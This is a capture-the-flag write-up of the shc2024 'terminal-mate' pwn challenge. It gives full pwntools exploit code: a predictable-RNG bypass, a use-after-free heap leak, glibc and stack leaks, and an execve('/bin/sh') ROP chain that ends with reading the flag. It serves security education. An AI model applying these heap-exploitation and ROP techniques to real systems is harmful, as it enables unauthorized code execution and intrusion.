# terminal-mate

[library.m0unt41n.ch/challenges/terminal-mate](https://library.m0unt41n.ch/challenges/terminal-mate) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

> *Hey there, office mates! Ready to spice up your work life? Introducing
> TerminalMate - the printer-action dating app that's here to bring some
> excitement to your workplace interactions.*
>
> *Swipe through profiles of fellow printer enthusiasts, hoping to find
> someonewho shares your passion for office **gadgets** and printer
> maintenance. But remember, discretion is key! Keep an eye out for the
> watchful gaze of the IT-administrators.*
> 
> *So, grab your **used but free** coffee mug and **rop** your way to your
> next printer-action adventures.*

What the program does is: once we "enable premium" (below), we can create /
update a single message, for a randomly selected user (out of 16). We can
also change / delete our own username.

Gadgets, ROP, used-but-free - that's quite a few hints &#128578;
[This post](https://gist.github.com/slick1015/8b64b8e6e44d444e8b9d32e2651071fb)
was useful in bringing me on the right track w.r.t. getting a stack address leak.
See also [Coderion's write-up](https://blog.gk.wtf/shc24/terminal-mate) - most
ideas seem similar there.

# Setting up 

## Improving the environment

I start with dumping my usual [pwndbg](https://github.com/pwndbg/pwndbg)
combo in the `Dockerfile`:

```Dockerfile
RUN apt-get install -y python3-pip python3-dev git libssl-dev libffi-dev build-essential gdb git 
RUN python3 -m pip install --upgrade pip pwntools
RUN git clone --branch 2023.07.17 https://github.com/pwndbg/pwndbg  ~/pwndbg && cd ~/pwndbg && ./setup.sh
RUN echo "set startup-quietly on" >~/.gdbearlyinit
RUN echo "source ~/pwndbg/gdbinit.py\n\
set show-tips off\n\
set max-visualize-chunk-size 192\n\
set debuginfod enabled off\n\
set breakpoint pending on\n" >~/.gdbinit
RUN echo "export LC_CTYPE=C.UTF-8" >>~/.bashrc
```

## Running it

```bash
docker build -t test . && docker run -p 1337:1337 -it test:latest
docker container exec -it $(docker ps -ql) /bin/bash
gdb -p $(pgrep TerminalMate)
```

## Decompiling it

Using [IDA](https://docs.hex-rays.com/getting-started/basic-usage) and some
creative annotations, I got a very clean, working [main.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/terminal-mate/main_ida.c).

### ROP gadgets

Note that there is a suggestive section in the disassembly too

```bash
.text:0000562719362329 gedgets:
.text:0000562719362329         endbr64
.text:000056271936232D         push    rbp
.text:000056271936232E         mov     rbp, rsp
.text:0000562719362331         pop     rax
.text:0000562719362332         retn
.text:0000562719362333         syscall
.text:0000562719362335         retn
.text:0000562719362336         db 90h
.text:0000562719362337         pop     rbp
.text:0000562719362338         retn
```

(I ended up not using it though)

## Setting up the pwn skeleton

```python
import pwn
pwn.context(arch='amd64', os='linux', encoding='utf-8', log_level='warning')
io = pwn.remote("127.0.0.1", 1337)

io.interactive()
io.close()
```

## Adding wrappers for interaction

To avoid long chains of pwn primitives, let's add some higher level functions:

### Basic `interact()` function

*   Read up to `prompt`. Result will be the return value.
*   If provided, send the `response`.
*   Optionally (`verbose`), print the dialog, just as if it was interactive.

```python
def interact(prompt, response=None, verbose=False):
    pred = io.recvuntil(prompt)
    if verbose:
        print(pred, end="")
    if not response is None:
        io.sendline(response)
        if verbose:
            print(response)
    return pred
```

### Multi-purpose `chat()` function

First of all, it gets rid of the whole "swipe" unpredictability - it enters
the swipe dialog, swipes until we get to the desired user (`num`). Then:

*   If the user did not have a message yet, send the provided `msg`
*   Otherwise, if `msg` was provided, update user's message to it.
*   And if it was not, just return whatever was the previous message.
*   Type `q`, capture the `Invalid direction` error, which will return to main menu

```python
def chat(num, msg=None):
    interact("Enter your choice: ", "1")
    while True:
        interact("Employee #")
        pick = int(interact(":").decode('ascii').replace(":", ""))
        if pick==num:
            interact("(l/r/c): ", "c")
            variant = interact(["Send your first message", "the message is: "]).decode('ascii')
            if "Send your first message" in variant:
                if msg is None:
                    print("Error! chat() asked to get message from user that does not have one!")
                    print("Will send 'ERROR' instead")
                    msg = "ERROR"
                interact(": ", msg)
            elif "the message is: " in variant:
                if msg is None:
                    msg = interact("\nDo you want to edit the message? (y/n)")
                    msg = msg.replace(b"\nDo you want to edit the message? (y/n)", b"")
                    interact(": ", "n")
                else:
                    interact(": ", "y")
                    interact("Enter your new message: ", msg)
            interact("(l/r/c): ", "q")
            interact("Invalid direction.\n")
            return msg
        else:
            interact("(l/r/c): ", "l")
```

Finally, wrappers for **GDPR** and **Change user name** menu options:

```python
def gdpr():
    interact("Enter your choice: ", "4")
    interact("Enter your choice: ", "2")

def rename(newname):
    interact("Enter your choice: ", "2")
    interact("Enter your new name: ", newname)
```

# Analysis

## Enabling Premium

`mannheim_random()` is a trivial RNG, using
`seed = BIGNUM1 * seed + BIGNUM2` pattern. What's more, after failing, the
program tells us what the "correct value" (i.e. previous seed) was. This
makes for a trivial process to "get premium":

*   Try once (and fail). Write down the code provided
*   Calculate next code using the same formula as `mannheim_random`
*   Try again, use that code and any string for CC number

This is the first opportunity to use above wrappers for a concise exploit:

```python
def mannheim_random(seed):
    return (0x5851F42D4C957F2D*seed+0x14057B7EF767814F)%(0x10000000000000000)

def premium(username):
    interact("Enter your name (8 chars): ", username)
    interact("Enter your choice: ", "3")
    interact("Enter your credit card number and we will send you a verification code: ", "0")
    interact("Enter the verification code: ", "0")
    interact("It should have been ")
    seed = int(interact(".").decode('ascii').replace(".", ""))
    verification_code = str(mannheim_random(seed))
    interact("Enter your choice: ", "3")
    interact("Enter your credit card number and we will send you a verification code: ", "0")
    interact("Enter the verification code: ", verification_code)

premium("myname")
```

With that, the exploit will put us back in the app dialog - with chat function enabled.

## Use-after-free and leak the heap base

There is a rather obvious UAF in `gdpr_menu()` - tt effectively does
`free(main_user)`, but the program keeps on using it. To test it:

*   Start the exploit
*   Select `GDPR` / `Delete data`. That already gives a hint that something
    is fishy (`"\xbe\xdf!c\x05, what would you like to do?"`)
*   Login to the container, run `gdb -p $(pgrep TerminalMate)`

What we see:

*   That freed-up chunk of RAM is just enough to allocate a single `struct Message`
    once we start "chatting".
*   Right after that `free()` we also get what looks like `heap_base>>12` - which is
    now inside of the `main_user` string.

    ```
    pwndbg> vis_heap_chunks
    (...)
    0x56021dfbe290 0x0000000000000000 0x0000000000000021 ........!.......
    0x56021dfbe2a0 0x000000056021dfbe 0x9b690456f26de78d ..!`......m.V.i. <-- tcachebins[0x20][0/1]
    0x56021dfbe2b0 0x0000000000000000 0x0000000000001011 ................

    pwndbg> arenas
    arena type arena address  heap address   map start      map end        perm size  offset file
    ---------- -------------- -------------- -------------- -------------- ---- ----- ------ ------
    main_arena 0x7f833741ac80 0x56021dfbe000 0x56021dfbe000 0x56021dfdf000 rw-p 21000      0 [heap]

    pwndbg> vmmap
    0x56021dfbe000     0x56021dfdf000 rw-p    21000      0 [heap]
    ```
    
    Thus, if we add following to `gdpr()`, it will now return that heap base address:

    ```python
    interact("Your data has been deleted.\n\n")
    return pwn.u64(io.recv(5)+b'\0\0\0')*4096
    ```

## Start the interaction

We can now start using all above functions, create the first message and interactively
build the exploit from here:

```python
# Unlock premium
premium("myname")

# Trigger UAF, leak heap address
heap_base = gdpr()
print("heap_base: ", hex(heap_base))

# Create first message.
chat(1, 256*"A")
```

Note that `struct Message` for that first message will overlap with `main_user` -
which we can both read and write. So, with some small limitations, we can control
the string pointer in that message and then, read / write that message, effectively
providing an arbitrary memory read / write facility.

As we find out later, the buffer for that first message has to be long enough
to hold the ROP chain - otherwise, "chatting" tries to free a bad pointer, which
causes an error / exit. That's why we have 256 here.

## Leak the main arena pointer

Now, for the most important observation: as documented in 
[many write-ups for similar challenges](https://www.google.com/search?q=malloc+maximum+size+for+tcache+bin+0x408)
&#128578; **freeing a malloc'd chunk larger than 0x408 bytes will put it in the large bin** -
which will give us a pointer into the glibc data segment.

In our code, we can trigger that by first, creating a >0x408b message and then, changing
it to *even* longer message, which will trigger realloc logic in `chat_edit_menu()`.
Let's do that:

```python
# Alloc & free a >0x408b chunk, putting it in largebins
chat(2, 0x421*"B")
chat(2, 0x431*"C")
```

Restart the exploit. Result:

```
$ ./exploit.py
heap_base:  0x564f746f5000
(...)
```

Reattach GDB:

```
pwndbg> vis_heap_chunks
(...)
0x564f746f6910	0x0000000000000042	0x0000000000000021	B.......!.......
0x564f746f6920	0x0000564f746f71b0	0x0000000000000431	.qotOV..1.......
0x564f746f6930	0x0000000000000000	0x0000000000000431	........1.......	 <-- largebins[0x0][0]
0x564f746f6940	0x00007f57d921b0d0	0x00007f57d921b0d0	..!.W.....!.W...

pwndbg> bins
(...)
largebins
0x400-0x430: 0x564f746f6930 —▸ 0x7f57d921b0d0 (main_arena+1104) ◂— 0x564f746f6930 /* '0iotOV' */
```

To get this pointer in the exploit:

*   Calculate runtime address of the main arena pointer (`heap_base` plus offset that can be
    calculated from `vis_heap_chunks`
*   Put (_"rename"_) that in `main_user` pointer
*   Main arena address will be printed as username (up to first zero, that is).
    We can use our flexible `chat()` function to get that.

```python
# Leak main_arena pointer
main_arena_ptr = heap_base + 0x564f746f6940 - 0x564f746f5000
print("main_arena_ptr", hex(main_arena_ptr))
rename(pwn.p64(main_arena_ptr))
main_arena = pwn.u64(chat(1)+b'\0\0') - 1104
print("main_arena: ", hex(main_arena))
```

We will use this _"rename and chat"_ pattern few more times through this write-up!

## Leak the glibc

Rerun the exploit, reattach GDB:

```
$ ./exploit.py
heap_base:  0x55cb8b378000
main_arena_ptr 0x55cb8b379940
main_arena:  0x7f138961ac80
(...)
```

With known `main_arena`, we can calculate all other glibc segments. We look at them
in the process map:

```
pwndbg> vmmap
    0x55cb8b378000     0x55cb8b399000 rw-p    21000      0 [heap]
    0x7f1389428000     0x7f13895bd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f13895bd000     0x7f1389615000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f138961a000     0x7f138961c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6

```

... and calculate all the offsets using deltas between that and `main_arena`:

```python
# Calculate other interesting glibc addresses
glibc_code = main_arena + 0x7f1389428000 - 0x7f138961ac80
print("glibc_code: ", hex(glibc_code))
glibc_rodata = main_arena + 0x7f13895bd000 - 0x7f138961ac80
print("glibc_rodata: ", hex(glibc_rodata))
glibc_rwdata = main_arena + 0x7f138961a000 - 0x7f138961ac80
print("glibc_rwdata: ", hex(glibc_rwdata))
```

## Leak the stack

Rerun the exploit, reattach GDB:

```
$ ./exploit.py
heap_base:  0x5589cc214000
main_arena_ptr 0x5589cc215940
main_arena:  0x7f0948a1ac80
glibc_code:  0x7f0948828000
glibc_rodata:  0x7f09489bd000
glibc_rwdata:  0x7f0948a1a000
(...)

pwndbg> arenas
  arena type    arena address    heap address       map start         map end    perm    size    offset    file
------------  ---------------  --------------  --------------  --------------  ------  ------  --------  ------
  main_arena   0x7f0948a1ac80  0x5589cc214000  0x5589cc214000  0x5589cc235000    rw-p   21000         0  [heap]

pwndbg> vmmap
    0x5589cc214000     0x5589cc235000 rw-p    21000      0 [heap]
    0x7f0948800000     0x7f0948828000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f0948828000     0x7f09489bd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f09489bd000     0x7f0948a15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f0948a15000     0x7f0948a16000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f0948a16000     0x7f0948a1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f0948a1a000     0x7f0948a1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffd14556000     0x7ffd14577000 rw-p    21000      0 [stack]
```

This confirms that the logic for glibc offsets is correct. We now need to find a place in glibc
data segment that can leak the stack. There should be plenty. Let's look for a
`0x007ffd14` signature:

```
pwndbg> search -4 0x7ffc88
libc.so.6       0x7f0948a1b533 0x576ec700007ffd14
libc.so.6       0x7f0948a1b53b 0x7ffd14
libc.so.6       0x7f0948a1ba23 0x100007ffd14
[anon_7f0948a1c] 0x7f0948a22203 0x7ffd14
[anon_7f0948ae5] 0x7f0948ae5a43 0x7ffd14
[anon_7f0948ae5] 0x7f0948ae5ddb 0x7ffd14
```

Note that the addresses have `3` and `b` suffixes - the actual stack addresses
will be `0` and `8` respectively (we looked for the middle part of a 64-bit
pointer). Poking at all these:

*   `libc.so.6 0x7f0948a1b533` looks useful:

    ```
    pwndbg> x/1xg 0x7f0948a1b530
    0x7f0948a1b530 <program_invocation_short_name>:	0x00007ffd14576ecc
    ```

*   `libc.so.6 0x7f0948a1b53b` looks useful:

    ```
    pwndbg> x/1xg 0x7f0948a1b538
    0x7f0948a1b538 <program_invocation_name>:	0x00007ffd14576ec7
    ```

*   `libc.so.6 0x7f0948a1ba23` looks useful

    ```
    pwndbg> x/1xg 0x7f0948a1ba20
    0x7f0948a1ba20 <__libc_argv>:	0x00007ffd14575658
    ```

*   `[anon_7f0948a1c] 0x7f0948a22203` has a stack pointer, but, with a
    `00` in the LSB, we may have problem putting it in a string.

    ```
    pwndbg> x/1xg 0x7f0948a22200
    0x7f0948a22200 <environ>:	0x00007ffd14575668
    ```

*   `[anon_7f0948ae5] 0x7f0948ae5a43` looks useful, but is not associated
    with a symbol, so, could be more variable:

    ```
    pwndbg> x/1xg 0x7f0948ae5a43
    0x7f0948ae5a43:	0x00000000007ffd14
    ```

*   `[anon_7f0948ae5] 0x7f0948ae5ddb` similarly.

    ```
    pwndbg> x/1xg 0x7f0948ae5ddb
    0x7f0948ae5ddb:	0x00000000007ffd14
    ```

Let's go with `__libc_argv` at `0x7f0948a1ba20`. We will use the same
*"rename and chat"* pattern as for `main_arena_ptr` / `main_arena`, to read
the actual pointer on stack. Looking at the earlier output, we had
`glibc_rwdata: 0x7f0948a1a000`. Therefore:

```python
# Get address of __libc_argv
libc_argv_ptr = glibc_rwdata + 0x7f0948a1ba20 - 0x7f0948a1a000
print("__libc_argv_ptr: ", hex(libc_argv_ptr))
rename(pwn.p64(libc_argv_ptr))
libc_argv = pwn.u64(chat(1)+b'\0\0') 
print("__libc_argv: ", hex(libc_argv))
```

With all that, we should have "a" somewhat stable stack pointer in `libc_argv`.


## Finding a return address for a ROP chain

Rerun the exploit, reattach GDB:

```
$ ./exploit.py
heap_base:  0x55a18bb25000
main_arena_ptr 0x55a18bb26940
main_arena:  0x7fdb3de1ac80
glibc_code:  0x7fdb3dc28000
glibc_rodata:  0x7fdb3ddbd000
glibc_rwdata:  0x7fdb3de1a000
__libc_argv_ptr:  0x7fdb3de1ba20
__libc_argv:  0x7ffeab9dacb8

pwndbg> print __libc_argv
$1 = (char **) 0x7ffeab9dacb8
```

We will try to get the `menu_loop()` return to the ROP chain instead of
`main()`. Let's see how
the stack looks inside of it. Set a breakpoint on the `scanf()` inside of
that (`*menu_loop+184`), type `x` to get back to menu and look at the stack
there:

```
pwndbg> break *menu_loop+184
pwndbg> c
# Press '0' to get back to the menu
pwndbg> stack
00:0000│ rsp rsi-7 0x7ffeab9dab60 ◂— 0x78007ffeab9dacb8
01:0008│           0x7ffeab9dab68 ◂— 0xaf04b6992869d700
02:0010│ rbp       0x7ffeab9dab70 —▸ 0x7ffeab9daba0 ◂— 0x1
03:0018│           0x7ffeab9dab78 —▸ 0x55a162efbe5a (main+172) ◂— mov eax, 0
04:0020│           0x7ffeab9dab80 ◂— 0x0
```

The retaddr is at `0x7ffeab9dab78`. We can calculate it in runtime, with an offset
from the `libc_argv` that we know (`0x7ffeab9dacb8`):

```python
# Calculate return address from menu_loop
return_from_menu_loop = libc_argv + 0x7ffeab9dab78 - 0x7ffeab9dacb8
print("ROP addr on stack: ", hex(return_from_menu_loop))
```

## Putting together a ROP chain

Rerun the exploit, reattach GDB:

```
$ ./exploit.py
heap_base:  0x55763da3b000
main_arena_ptr 0x55763da3c940
main_arena:  0x7ff584c1ac80
glibc_code:  0x7ff584a28000
glibc_rodata:  0x7ff584bbd000
glibc_rwdata:  0x7ff584c1a000
__libc_argv_ptr:  0x7ff584c1ba20
__libc_argv:  0x7ffd0f58ac28
ROP addr on stack:  0x7ffd0f58aae8
(...)
```

I initially tried to ROP with a simple `system()` call. But, with a heap in
somewhat corrupted state, it was crashing the program. So I went with a
syscall instead.

We are building the following chain:

*   Pointer to `pop rdi ; ret`
*   Pointer to `"/bin/sh"`
*   Pointer to `pop rsi ; ret`
*   0
*   Pointer to `pop rax ; pop rdx ; pop rbx ; ret`
*   `59` (syscall ID for `execve`)
*   0
*   0
*   Pointer to `syscall`

Then, we'll write it at the `return_from_menu_loop` calculated above.
We will find offsets of these parts relative to above `glibc_rodata`
(`0x7ff584bbd000`) and `glibc_code` (`0x7ff584a28000`)

### Finding gadgets

There are some gadgets provided in the program (see above), but, they
don't seem particularly interesting. But we have the whole glibc to
look for better ones:

*   **`/bin/sh`**

    ```
    pwndbg> search "/bin/sh" libc
    libc.so.6       0x7ff584bd8678 0x68732f6e69622f /* '/bin/sh' */
    ```
    ```python
    # Find gadgets
    bin_sh = glibc_rodata + 0x7ff584bd8678 - 0x7ff584bbd000
    print("/bin/sh: ", hex(bin_sh))
    ```

*   **`pop rdi ; ret`** - opcodes: `5f c3`

    ```
    pwndbg> search --trunc-out -2 0xc35f libc
    libc.so.6       0x7ff584a2a3e5 pop rdi
    ```
    ```python
    pop_rdi_gadget = glibc_code + 0x7ff584a2a3e5 - 0x7ff584a28000
    print("pop_rdi gadget: ", hex(pop_rdi_gadget))
    ```

*   **`pop rsi ; ret`** - opcodes `5e c3`

    ```
    pwndbg> search --trunc-out -2 0xc35e libc
    libc.so.6       0x7ff584a2be51 pop rsi
    ```
    ```python
    pop_rsi_gadget = glibc_code + 0x7ff584a2be51 - 0x7ff584a28000
    print("pop_rsi gadget: ", hex(pop_rsi_gadget))
    ```

*   **`pop rax ; pop rdx ; pop rbx ; ret`** - opcodes `58 5a 5b c3`<br>
    Why? Because there was no `pop rdx ; ret` &#128539;

    ```
    pwndbg> search --trunc-out -4 0xc35b5a58 libc
    libc.so.6       0x7ff584a904a8 pop rax
    ```
    ```python
    pop_rax_rdx_rbx_gadget = glibc_code + 0x7ff584a904a8 - 0x7ff584a28000
    print("pop_rax_rdx_rbx_gadget: ", pop_rax_rdx_rbx_gadget)
    ```

*   **`syscall`** - opcodes `0f 05`

    ```
    pwndbg> search --trunc-out -2 0x050f libc
    libc.so.6       0x7ff584a29db4 syscall 
    ```
    ```python
    syscall_gadget = glibc_code + 0x7ff584a29db4 - 0x7ff584a28000
    print("syscall gadget: ", hex(syscall_gadget))
    ```

## Executing the ROP chain

First, we put it on stack (*"rename and chat"* yet again!) and then, select
option `5` (exit) which will hopefully get us a shell:

```python
# Prepare the ROP chain
rename(pwn.p64(return_from_menu_loop))
rop_chain = pwn.p64(pop_rdi_gadget)
rop_chain += pwn.p64(bin_sh)
rop_chain += pwn.p64(pop_rsi_gadget)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(pop_rax_rdx_rbx_gadget)
rop_chain += pwn.p64(59)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(syscall_gadget)
chat(1, rop_chain)

# Exit the main loop - get a shell
interact("Enter your choice: ", "5")
io.interactive()
```

And indeed:

```
$ ls -la
total 7204
drwxr-xr-x. 1 root root    4096 Oct  8 13:20 .
drwxr-xr-x. 1 root root    4096 Oct  7 10:32 ..
-rwxr-xr-x. 1 root root   18512 Sep 26 21:48 TerminalMate
-rw-r--r--. 1 root root      27 Sep 26 21:48 flag.txt
$ cat flag.txt
shc2024{LOCAL_TESTING_FLAG}$
```

This works just as well on the remote instance. Full exploit: [exploit.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/terminal-mate/exploit.py).

# Bonus: Original source

As a bonus, once I did this in the remote instance, I also got the original
[main.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/terminal-mate/main_orig.c) and [Makefile](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/terminal-mate/Makefile.orig) &#128578;

---

## `shc2024{ropertus_turned_a_wizard_with_30}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
